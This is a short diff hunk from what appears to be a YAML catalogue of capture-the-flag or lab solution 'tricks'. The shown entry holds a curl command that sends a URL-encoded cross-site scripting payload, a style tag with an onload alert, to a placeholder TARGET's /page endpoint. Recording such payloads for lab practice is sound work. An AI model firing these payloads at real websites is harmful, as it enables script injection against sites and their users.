@@ -39,4 +39,3 @@ tricks:
     how: "GET request to /page with name parameter"
     payload: |
       curl "http://TARGET/page?name=%3Cstyle/onload=alert(%27XSS%27)%3E"
-
